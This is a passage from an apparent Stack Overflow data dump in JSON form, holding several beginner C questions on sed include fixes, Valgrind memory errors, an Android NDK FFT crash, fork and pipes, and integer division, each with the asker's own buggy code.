clearer now.</p>\n\n<p>Again, thanks!</p>\n"},{"tags":["c++","c","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":13278391,"title":"Changing #include filenames to match case","body":"<p>I have a body of C/C++ source code where the filename in the #include statement does not match the *.h file exactly. The match is correct, but is case insensitive. This is the type of source files that occur in a Windows system.</p>\n\n<p>I want to change all the source files so that all <code>#include</code> statements are exact matches to the filenames they refer to.</p>\n\n<p>All filenames to change are enclosed in quotes.</p>\n\n<p>Example:</p>\n\n<p>List of files</p>\n\n<pre><code>File1.h\nFILE2.H\nfile1.cpp\n</code></pre>\n\n<p>file1.cpp</p>\n\n<pre><code>#include \"file1.h\"\n#include \"file2.h\"\n</code></pre>\n\n<p>Change file1.cpp to</p>\n\n<pre><code>#include \"File1.h\"\n#include \"FILE2.H\"\n</code></pre>\n\n<p>I would like to create an automated script to perform this update.</p>\n\n<p>I have listed steps below that are pieces of this process, but I can't seem to bring the pieces together.</p>\n\n<ol>\n<li>Create a list of all *.h files, <code>ls *.h &gt; include.lst</code>. This creates a file of all the filenames with the correct case.</li>\n<li>Using the filenames in <code>include.lst</code> create a sed command <code>'s/&lt;filename&gt;/&lt;filename&gt;/I'</code> which does a case insensitive search and replaces the match with properly cased filename. I believe I only have to do the replacement once, but adding the global g will take care of multiple occurances.</li>\n<li>Apply this list of replacements to all files in a directory.</li>\n</ol>\n\n<p>I would like suggestions on how to create the sed command 2) given <code>include.lst</code>. I think I can handle the rest.</p>\n"},{"tags":["c","valgrind"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13279631,"title":"Valgrind Errors","body":"<p>I am having trouble deciphering the Valgrind output that I am getting.  For example I have an error that says I am doing an illegal write of size 1.  So I added one to the malloc and that doesn't change anything.  Since I have never used Valgrind before, I thought it would be best to get some help after searching online yielded no responses.  Please be aware that I am not looking for the answer so I have not reproduced my code.  I would like to be pushed in the correct direction so that I can combat future errors.\nThanks!</p>\n\n<pre><code>==28881== Memcheck, a memory error detector\n==28881== Copyright (C) 2002-2009, and GNU GPL'd, by Julian Seward et al.\n==28881== Using Valgrind-3.6.0.SVN-Debian and LibVEX; rerun with -h for copyright info\n==28881== Command: ./sws root\n==28881==\n==28892== Conditional jump or move depends on uninitialised value(s)\n==28892==    at 0x4C286D9: __GI_strlen (mc_replace_strmem.c:284)\n==28892==    by 0x4040B7: get_headers (html.c:280)\n==28892==    by 0x402D77: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Conditional jump or move depends on uninitialised value(s)\n==28892==    at 0x4C286D9: __GI_strlen (mc_replace_strmem.c:284)\n==28892==    by 0x4040C5: get_headers (html.c:280)\n==28892==    by 0x402D77: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Conditional jump or move depends on uninitialised value(s)\n==28892==    at 0x4C286D9: __GI_strlen (mc_replace_strmem.c:284)\n==28892==    by 0x4040D3: get_headers (html.c:280)\n==28892==    by 0x402D77: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Conditional jump or move depends on uninitialised value(s)\n==28892==    at 0x4C286D9: __GI_strlen (mc_replace_strmem.c:284)\n==28892==    by 0x4040E1: get_headers (html.c:280)\n==28892==    by 0x402D77: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Invalid write of size 1\n==28892==    at 0x4C2874C: strcpy (mc_replace_strmem.c:311)\n==28892==    by 0x4041E1: get_headers (html.c:299)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x402D84: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Invalid write of size 1\n==28892==    at 0x4C2875F: strcpy (mc_replace_strmem.c:311)\n==28892==    by 0x4041E1: get_headers (html.c:299)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be034 is 4 bytes after a block of size 32 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x402D84: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Invalid read of size 1\n==28892==    at 0x4C28374: strcat (mc_replace_strmem.c:176)\n==28892==    by 0x4041F7: get_headers (html.c:300)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x402D84: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Invalid write of size 1\n==28892==    at 0x4C2838C: strcat (mc_replace_strmem.c:176)\n==28892==    by 0x4041F7: get_headers (html.c:300)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be034 is 4 bytes after a block of size 32 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x402D84: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Invalid write of size 1\n==28892==    at 0x4C2839F: strcat (mc_replace_strmem.c:176)\n==28892==    by 0x4041F7: get_headers (html.c:300)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be061 is 15 bytes before a block of size 40 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x403E53: get_headers (html.c:224)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Invalid read of size 1\n==28892==    at 0x4C28374: strcat (mc_replace_strmem.c:176)\n==28892==    by 0x40420D: get_headers (html.c:301)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892== Invalid read of size 1\n==28892==    at 0x4C28374: strcat (mc_replace_strmem.c:176)\n==28892==    by 0x40420D: get_headers (html.c:301)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x402D84: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Invalid write of size 1\n==28892==    at 0x4C2838C: strcat (mc_replace_strmem.c:176)\n==28892==    by 0x40420D: get_headers (html.c:301)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be061 is 15 bytes before a block of size 40 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x403E53: get_headers (html.c:224)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Invalid read of size 1\n==28892==    at 0x4C28374: strcat (mc_replace_strmem.c:176)\n==28892==    by 0x404223: get_headers (html.c:302)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x402D84: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Invalid read of size 1\n==28892==    at 0x4C28374: strcat (mc_replace_strmem.c:176)\n==28892==    by 0x404239: get_headers (html.c:303)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x402D84: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Invalid write of size 1\n==28892==    at 0x4C2838C: strcat (mc_replace_strmem.c:176)\n==28892==    by 0x404239: get_headers (html.c:303)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be098 is 0 bytes after a block of size 40 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x403E53: get_headers (html.c:224)\n==28892==    by 0x402E00: read_page (networking.c:347)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Invalid read of size 1\n==28892==    at 0x4C286E4: __GI_strlen (mc_replace_strmem.c:284)\n==28892==    by 0x402E0F: read_page (networking.c:348)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x402D84: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892== Syscall param socketcall.sendto(msg) points to unaddressable byte(s)\n==28892==    at 0x5121052: send (send.c:28)\n==28892==    by 0x40276D: send_msg (networking.c:245)\n==28892==    by 0x402E29: read_page (networking.c:348)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd\n==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)\n==28892==    by 0x402D84: read_page (networking.c:341)\n==28892==    by 0x402B8E: get_page (networking.c:310)\n==28892==    by 0x40268E: header_parse (networking.c:232)\n==28892==    by 0x401D96: retrieve_msg (networking.c:62)\n==28892==    by 0x401AAB: main (sws.c:139)\n==28892==\n==28892==\n==28892== HEAP SUMMARY:\n==28892==     in use at exit: 337 bytes in 10 blocks\n==28892==   total heap usage: 19 allocs, 9 frees, 3,307 bytes allocated\n==28892==\n==28892== LEAK SUMMARY:\n==28892==    definitely lost: 337 bytes in 10 blocks\n==28892==    indirectly lost: 0 bytes in 0 blocks\n==28892==      possibly lost: 0 bytes in 0 blocks\n==28892==    still reachable: 0 bytes in 0 blocks\n==28892==         suppressed: 0 bytes in 0 blocks\n==28892== Rerun with --leak-check=full to see details of leaked memory\n==28892==\n==28892== For counts of detected and suppressed errors, rerun with: -v\n==28892== Use --track-origins=yes to see where uninitialised values come from\n==28892== ERROR SUMMARY: 348 errors from 17 contexts (suppressed: 4 from 4)\n==28881==\n==28881== HEAP SUMMARY:\n==28881==     in use at exit: 0 bytes in 0 blocks\n==28881==   total heap usage: 0 allocs, 0 frees, 0 bytes allocated\n==28881==\n==28881== All heap blocks were freed -- no leaks are possible\n==28881==\n==28881== For counts of detected and suppressed errors, rerun with: -v\n==28881== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 4 from 4)\n</code></pre>\n\n<hr>\n\n<pre><code>217 int get_headers(char* time, char* last_modified, char* server, char* content_type, size_t msglen, char* header, int flag)\n218 {\n219         char* header1 = NULL;\n220         char* header2 = NULL;\n221         char* header3 = NULL;\n222         char* header4 = NULL;\n223         char* header5 = NULL;\n224\n225         if ((header1 = (char*)malloc(strlen(\"Date: \")+strlen(time)+2) ) ==NULL)\n226         {\n227                 fprintf(stderr, \"%s: No more memory\\n\", getprogname());\n228                 exit(EXIT_FAILURE);\n229         }\n230\n231\n232         strcpy(header1, \"Date: \");\n233         strcat(header1, time);\n234         strcat(header1, \"\\n\");\n235\n236\n237         if ((header2 = (char*)malloc(strlen(\"Last-Modified: \")+strlen(last_modified)+5) ) ==NULL)\n238         {\n239                 fprintf(stderr, \"%s: No more memory\\n\", getprogname());\n240                 exit(EXIT_FAILURE);\n241         }\n242\n243\n244         strcpy(header2, \"Last-Modified: \");\n245         strcat(header2, last_modified);\n246         strcat(header2, \"\\n\");\n247\n248\n249         if ((header3 = (char*)malloc(strlen(\"Server: \")+strlen(server)+5) ) ==NULL)\n250         {\n251                 fprintf(stderr, \"%s: No more memory\\n\", getprogname());\n252                 exit(EXIT_FAILURE);\n253         }\n254\n255\n256         strcpy(header3, \"Server: \");\n257         strcat(header3, server);\n258         strcat(header3, \"\\n\");\n259\n260\n261         if ((header4 = (char*)malloc(strlen(\"Content-Type: \")+strlen(content_type)+5) ) ==NULL)\n262         {\n263                 fprintf(stderr, \"%s: No more memory\\n\", getprogname());\n264                 exit(EXIT_FAILURE);\n265         }\n266\n267\n268         strcpy(header4, \"Content-Type: \");\n269         strcat(header4, content_type);\n270         strcat(header4, \"\\n\");\n271\n272\n273         int content_length = strlen(header1)+strlen(header2)+strlen(header3)+strlen(header4)+strlen(\"Content-Length: \")+msglen+5;\n274         char temp[10] = {' '};\n275         snprintf(temp, sizeof(msglen),\"%d\", content_length);\n276\n277         if ((header5 = (char*)malloc(strlen(\"Content-Length: \")+strlen(temp)+5) ) ==NULL)\n278         {\n279                 fprintf(stderr, \"%s: No more memory\\n\", getprogname());\n280                 exit(EXIT_FAILURE);\n281         }\n282\n283\n284         strcpy(header5, \"Content-Length: \");\n285         strncat(header5, temp, strlen(temp));\n286         strcat(header5, \"\\n\\n\");\n287\n288\n289         if(flag == 1)\n290         {\n291                 strcpy(header, header1);\n292                 strcat(header, header2);\n293                 strcat(header, header3);\n294                 strcat(header, header4);\n295                 strcat(header, header5);\n296         }\n297\n298         return content_length;\n299         free(header1);\n300         free(header2);\n301         free(header3);\n302         free(header4);\n303         free(header5);\n304 }\n</code></pre>\n"},{"tags":["java","android","c","android-ndk","native"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":16,"score":1,"question_id":13279833,"title":"Android API Jelly bean Fatal Signal 11 with NDK function","body":"<p>I have a program with a thread that calls a FFT function in C NDK, it is working but with Jelly bean 4.1 it's not working. It doesn't seem to work like it should at all in Jelly bean, the native function is going out of the array length and then causing it to shut down with Fatal Signal 11.</p>\n\n<p>The function call makeFFT is the native function..</p>\n\n<p>Here is my thread code:</p>\n\n<pre><code>public void calculationMotor() throws Exception\n    {               \n        try\n        {           \n            if(this._fftBufferL!=null)\n            {\n\n                try\n                {\n                    makeFFT(this._fftBufferL, this._fftBufferL.length/2);\n\n                }catch(Exception e)\n                {\n                    //Log.e(\"ERRRRR\", \"\"+e.getMessage());\n                }\n\n                int LEN = this._fftBufferL.length/2;\n\n                double best_amplitude = 0;\n                int min_frequency_fft = Math.round(MIN_FREQUENCY * LEN / RATE);\n                int max_frequency_fft = Math.round(MAX_FREQUENCY * LEN / RATE);\n                double best_frequency = min_frequency_fft;\n\n\n                    for (int i = min_frequency_fft; i &lt;= max_frequency_fft; i++) \n                    {\n                        double current_frequency = i * 1.0 * RATE   / LEN;\n                        double current_amplitude = Math.pow(this._fftBufferL[i * 2], 2) + Math.pow(this._fftBufferL[i * 2 + 1], 2);\n                        double normalized_amplitude = current_amplitude * Math.pow(MIN_FREQUENCY * MAX_FREQUENCY, 0.5) / current_frequency; \n\n                        if (normalized_amplitude &gt; best_amplitude) \n                        {\n                            best_frequency = current_frequency;\n                            best_amplitude = normalized_amplitude;\n                        }\n                    }               \n\n                    _bestHZL        = best_frequency;\n                    this._done = true;\n            }\n\n        }catch(Exception ex)\n        {               \n            throw ex;\n        }       \n    }\n</code></pre>\n\n<p>And here are my native C code where the error occurs when as I can guess by my tests that J becomes larger than the array length:</p>\n\n<pre><code>    void DoFFTInternal(jdouble* data, jint nn) {\n    unsigned long n, mmax, m, j, istep, i;\n    jdouble wtemp, wr, wpr, wpi, wi, theta;\n    jdouble tempr, tempi;\n\n    // reverse-binary reindexing\n    n = nn&lt;&lt;1;\n    j=1;\n    for (i=1; i&lt;n; i+=2) {\n        if (j&gt;i) {\n            double dd = 0;\n            dd = data[j-1];\n            data[j-1] = data[i-1];\n            data[i-1] = dd;\n\n            dd = data[j];\n            data[j] = data[i];\n            data[i] = dd;\n\n\n        }\n        m = nn;\n        while (m&gt;=2 &amp;&amp; j&gt;m) {\n            j -= m;\n            m &gt;&gt;= 1;\n        }\n        j += m;\n    };\n\n    mmax=2;\n    while (n&gt;mmax) {\n        istep = mmax&lt;&lt;1;\n        theta = -(2*M_PI/mmax);\n        wtemp = sin(0.5*theta);\n        wpr = -2.0*wtemp*wtemp;\n        wpi = sin(theta);\n        wr = 1.0;\n        wi = 0.0;\n        for (m=1; m &lt; mmax; m += 2) {\n            for (i=m; i &lt;= n; i += istep) {\n                j=i+mmax;\n                tempr = wr*data[j-1] - wi*data[j];\n                tempi = wr * data[j] + wi*data[j-1];\n\n                data[j-1] = data[i-1] - tempr;\n                data[j] = data[i] - tempi;\n                data[i-1] += tempr;\n                data[i] += tempi;\n            }\n            wtemp=wr;\n            wr += wr*wpr - wi*wpi;\n            wi += wi*wpr + wtemp*wpi;\n                            }\n           mmax=istep;\n      }\n   }\n jint Java_com_gggg_sound_fft_InfernalFFTX_makeFFT(JNIEnv *env, jobject obj, jdoubleArray data, jint size)  \n {\n    jdouble *source_data = (*env)-&gt;GetDoubleArrayElements(env, data, JNI_FALSE);\n    DoFFTInternal(source_data, size);\n    (*env)-&gt;ReleaseDoubleArrayElements(env, data, source_data, 0); \n    return 0;  \n } \n</code></pre>\n\n<p>It happens on these two lines:</p>\n\n<pre><code>data[j-1] = data[i-1] - tempr;\ndata[j] = data[i] - tempi;\n</code></pre>\n\n<p>Like I said, it's working in earlier APIs but not in Jelly bean, I've tried it in the emulator API 4.1 and on a Nexus 7 with API 4.1.2 and both are making the Fatal Signal 11 error.</p>\n\n<p>As you can see in the following logcat, it skips alot but that is another problem that I already know about. Here's my logcat when I was using the emulator:</p>\n\n<pre><code>11-07 23:36:21.654: D/gralloc_goldfish(635): Emulator without GPU emulation detected.\n11-07 23:36:21.793: D/dalvikvm(635): GC_FOR_ALLOC freed 82K, 3% free 8596K/8775K, paused 53ms, total 58ms\n11-07 23:36:21.803: I/dalvikvm-heap(635): Grow heap (frag case) to 8.895MB for 473416-byte allocation\n11-07 23:36:21.964: D/dalvikvm(635): GC_CONCURRENT freed &lt;1K, 3% free 9058K/9287K, paused 95ms+10ms, total 165ms\n11-07 23:36:21.964: D/dalvikvm(635): WAIT_FOR_CONCURRENT_GC blocked 69ms\n11-07 23:36:22.123: D/dalvikvm(635): GC_FOR_ALLOC freed &lt;1K, 2% free 9441K/9607K, paused 47ms, total 47ms\n11-07 23:36:22.323: I/Choreographer(635): Skipped 41 frames!  The application may be doing too much work on its main thread.\n11-07 23:36:22.923: I/Choreographer(635): Skipped 77 frames!  The application may be doing too much work on its main thread.\n11-07 23:36:48.243: D/dalvikvm(635): GC_FOR_ALLOC freed 966K, 12% free 8621K/9735K, paused 39ms, total 42ms\n11-07 23:36:48.695: D/dalvikvm(635): GC_CONCURRENT freed 9K, 8% free 9017K/9735K, paused 112ms+127ms, total 317ms\n11-07 23:36:49.583: D/dalvikvm(635): GC_CONCURRENT freed 63K, 3% free 9455K/9735K, paused 109ms+113ms, total 334ms\n11-07 23:36:50.314: D/dalvikvm(635): GC_CONCURRENT freed 47K, 2% free 9891K/9991K, paused 106ms+112ms, total 319ms\n11-07 23:36:50.573: I/TextToSpeech(635): Sucessfully bound to com.svox.pico\n11-07 23:36:50.593: I/Choreographer(635): Skipped 48 frames!  The application may be doing too much work on its main thread.\n11-07 23:36:52.114: I/Choreographer(635): Skipped 373 frames!  The application may be doing too much work on its main thread.\n11-07 23:36:52.543: I/TextToSpeech(635): Connected to ComponentInfo{com.svox.pico/com.svox.pico.PicoService}\n11-07 23:36:53.214: I/Choreographer(635): Skipped 206 frames!  The application may be doing too much work on its main thread.\n11-07 23:36:55.084: I/Choreographer(635): Skipped 85 frames!  The application may be doing too much work on its main thread.\n11-07 23:36:55.224: I/Choreographer(635): Skipped 35 frames!  The application may be doing too much work on its main thread.\n11-07 23:36:58.343: D/dalvikvm(635): GC_CONCURRENT freed 89K, 3% free 10416K/10631K, paused 79ms+23ms, total 210ms\n11-07 23:36:58.423: D/dalvikvm(635): Trying to load lib /data/data/com.gggg.ach.app/lib/libfft.so 0x411ea770\n11-07 23:36:58.423: D/dalvikvm(635): Added shared lib /data/data/com.gggg.ach.app/lib/libfft.so 0x411ea770\n11-07 23:36:58.423: D/dalvikvm(635): No JNI_OnLoad found in /data/data/com.gggg.ach.app/lib/libfft.so 0x411ea770, skipping init\n11-07 23:36:58.433: D/dalvikvm(635): Trying to load lib /data/data/com.gggg.ach.app/lib/libfft.so 0x411ea770\n11-07 23:36:58.433: D/dalvikvm(635): Shared lib '/data/data/com.gggg.ach.app/lib/libfft.so' already loaded in same CL 0x411ea770\n11-07 23:36:58.623: I/Choreographer(635): Skipped 33 frames!  The application may be doing too much work on its main thread.\n11-07 23:36:59.053: A/libc(635): Fatal signal 11 (SIGSEGV) at 0x459659bb (code=2), thread 675 (Thread-88)\n</code></pre>\n"},{"tags":["c","fork","pipes"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13279671,"title":"2 children write to pipe, parent reads from pipe in C","body":"<p>I've searched and searched to no avail, so I've finally come to ask for some help. \nMy assignment involves (in C running on RedHat Linux) creating two child processes, each of which write characters for an arbitrary amount of iterations to a pipe. This pipe is shared with the parent process that created them. The parent reads from the pipe while the children still have characters to write to it. Once the children have exited and the pipe is empty, the parent(main) can then terminate.</p>\n\n<p>Here is a quick &amp; dirty example of the logic of the code I have written.</p>\n\n<pre><code>main()\n{\n      //create pipe\n\n      fork(); //childA\n      //writes to pipe \n\n      fork(); //childB\n      //writes to pipe\n\n      //parent reading\n      while(condition) {\n          //read from pipe + print chars to terminal\n      }\n}\n</code></pre>\n\n<p>Now, my question is regarding the condition of the while loop. \nI need to read when the children are blocked from writing due to a full pipe, but I cannot figure out what type of condition would allow me to do this. Any help would be absolutely amazing. </p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13264161,"title":"Decimal to Binary conversion not working","body":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint myatoi(const char* string) {\n  int i = 0;\n  while (*string) {\n    i = (i &lt;&lt; 3) + (i&lt;&lt;1) + (*string -'0');\n    string++;\n  }\n  return i;\n}\n\nvoid decimal2binary(char *decimal, int *binary) {\n  decimal = malloc(sizeof(char) * 32);\n  long int dec = myatoi(decimal);\n  long int fraction;\n  long int remainder;\n  long int factor = 1;\n  long int fractionfactor = .1;\n  long int wholenum;\n  long int bin;\n  long int onechecker;\n  wholenum = (int) dec;\n  fraction = dec - wholenum;\n\n  while (wholenum != 0 ) {\n    remainder = wholenum % 2;  // get remainder\n    bin = bin + remainder * factor;  // store the binary as you get remainder\n    wholenum /= 2;  // divide by 2\n    factor *= 10;  // times by 10 so it goes to the next digit\n  }\n  long int binaryfrac = 0;\n  int i;\n  for (i = 0; i &lt; 10; i++) {\n    fraction *= 2;  // times by two first\n    onechecker = fraction;  // onechecker is for checking if greater than one\n    binaryfrac += fractionfactor * onechecker;  // store into binary as you go\n    if (onechecker == 1) {\n      fraction -= onechecker;  // if greater than 1 subtract the 1\n    }   \n    fractionfactor /= 10;\n  }\n\n  bin += binaryfrac;\n  *binary = bin;\n  free(decimal);\n}\n\nint main(int argc, char **argv) {   \n  char *data;\n  data = malloc(sizeof(char) * 32);\n  int datai = 1;\n  if (argc != 4) {\n    printf(\"invalid number of arguments\\n\");\n    return 1;\n  }\n  if (strcmp(argv[1], \"-d\")) {  \n    if (strcmp(argv[3], \"-b\")) {\n      decimal2binary(argv[2], &amp;datai);\n      printf(\"output is : %d\" , datai);\n    } else {\n      printf(\"invalid parameter\");\n    }\n  } else {\n    printf(\"invalid parameter\");\n  }\n  free(data);\n  return 0;\n}\n</code></pre>\n\n<p>In this problem, <code>myatoi</code> works fine and the <code>decimal2binary</code> algorithm is correct, but every time I run the code it gives my output as 0. I do not know why. Is it a problem with pointers? I already set the address of variable data but the output still doesn't change.</p>\n\n<pre><code>./dec2bin \"-d\" \"23\" \"-b\"\n</code></pre>\n"},{"tags":["c","arrays","division"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":72,"score":-2,"question_id":13278685,"title":"Integer division returns 0 in C","body":"<p>An integer division caused by the elements of an array returns 0, I'm supposed to store the % in the same array....</p>\n\n<pre><code>array[6][i]=array[5][i]/total;\n</code></pre>\n\n<p>This stores a 0... I thought it had something to do with the array being an integer array... so I did a cast...</p>\n\n<pre><code>array[6][i]=(int)(array[5][i]/total); \n</code></pre>\n\n<p>Still stored 0... I read I had to convert them to floating points but the casting doesn't work... I tried this</p>\n\n<pre><code>array[6][i]=(int)((float)array[5][i]/(float)total); \n</code></pre>\n\n<p>the array 